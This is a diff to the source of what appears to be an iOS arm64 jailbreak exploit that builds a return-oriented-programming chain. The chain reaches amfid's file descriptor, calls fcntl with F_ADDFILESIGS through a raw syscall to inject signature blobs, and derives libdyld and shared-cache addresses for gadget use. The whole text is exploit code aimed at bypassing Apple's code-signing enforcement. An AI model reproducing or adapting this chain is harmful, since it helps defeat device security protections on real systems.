@@ -814,9 +814,6 @@ FuncCall4([dy solveSymbol:@"_syscall"], sysnumber, 0, 0, 0);\
     strcpy(argss->msg, "this is arm64 rop! -qwertyoruiop\namfi fd: %p\nfcntl ret: %p\n");
     strcpy(argss->path, "/usr/libexec/amfid_");
     strcpy(argss->dys, "__dyld_fast_stub_entry");
-    argss->sig.fs_file_start = 0;
-    argss->sig.fs_blob_start = 37120;
-    argss->sig.fs_blob_size = 336;
     /*
  struct kern_stackframe {
  uint64_t image_ptr;
@@ -862,11 +859,20 @@ FuncCall4([dy solveSymbol:@"_syscall"], sysnumber, 0, 0, 0);\
     
     //Set8(0x4848484848484848);
 
+    argss->sig.fs_file_start = 0;
+    argss->sig.fs_blob_start = 37120;
+    argss->sig.fs_blob_size = 336;
+
     {
         uint64_t* tmpz = 0;
         LoadR0(SEG_VAR(amfi_fd));
         WriteR0(0x13414141414;tmpz=stack);
-        FuncCall4([dy solveSymbol:@"_fcntl"], 0; *tmpz = segstack, F_ADDFILESIGS, SEG_VAR(sig), 0);
+        FuncCall4([dy solveSymbol:@"_syscall"], SYS_fcntl, 0, 0, 0);
+        *tmpz = segstack;
+        *stack++ = 0;
+        *stack++ = F_ADDFILESIGS;
+        *stack++ = SEG_VAR(sig);
+        *stack++ = 0;
         *stack_tmp = segstack;
         WriteR0(SEG_VAR(retv));
 
@@ -939,7 +945,7 @@ FuncCall4([dy solveSymbol:@"_syscall"], sysnumber, 0, 0, 0);\
     
     
     LoadR0(SEG_VAR(shared_cache_base));
-    AddR0(0x16c85230); // pointer to libdyld BSS
+    AddR0(_LDYLD_BSS - _DYCACHE_BASE); // pointer to libdyld BSS
     WriteR0(SEG_VAR(zero_this));
 
     for (int i=0; i < 0xF0; i+=8)
@@ -976,7 +982,7 @@ FuncCall4([dy solveSymbol:@"_syscall"], sysnumber, 0, 0, 0);\
         LoadR0(SEG_VAR(zero_this));
         WriteR0(0x13414141414;tmpy=stack;);
        */
-        Set19_20_21_22_23_24_25_26_27_28(0x14FF00000+0x0000040b0,0x1337414113374242,0,0,0,0,0,0,0,0);
+        Set19_20_21_22_23_24_25_26_27_28(0x14FF00000+0x0000040b0,mov_x0_0_ret-0x4ff00000,0,0,0,0,0,0,0,0);
         stack_tmp = stack;
         *stack++ = 0x4141414141414141;
         *stack++ = str_x20_x19_ldr_x29x30x20x19x22x21;
